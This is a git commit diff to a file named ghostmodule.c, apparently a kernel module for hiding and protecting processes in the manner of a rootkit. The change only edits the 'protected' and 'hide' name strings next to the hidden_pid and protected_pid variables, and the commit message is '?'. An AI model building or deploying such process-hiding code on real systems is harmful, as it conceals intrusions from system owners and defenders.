1108ad51b48b4789dc68c52a7092d9fd703e2c24
ASxx <oliver12125@sina.com>
2019-12-22 20:00:03 +0800

    ?

--- program/ghost/ghostmodule.c
+++ program/ghost/ghostmodule.c
@@ -21,8 +21,8 @@
 
 
 #define FLAG 0x80000000
-const char *protected = "[md]";
-const char *hide = "[md]";
+const char *protected = "md";
+const char *hide = "md";
 int hidden_pid=-1;
 int protected_pid=-1;
 
